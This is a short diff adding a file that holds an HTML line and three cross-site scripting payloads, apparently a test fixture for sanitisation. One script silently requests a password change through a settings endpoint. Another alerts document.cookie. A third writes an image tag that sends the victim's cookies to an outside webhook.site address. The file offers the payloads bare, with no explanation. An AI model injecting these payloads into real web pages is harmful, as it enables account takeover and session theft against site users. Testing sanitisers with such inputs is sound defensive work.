@@ -1,0 +1,8 @@
+hello <u>world</u>
+
+<script>fetch('/settings?new_password=pass123');</script>
+
+<script>alert(document.cookie)</script>
+
+<script>document.write('<img src="https://webhook.site/xxx-xxx-xxx/?c='%2bdocument.cookie%2b'" />');</script>
+
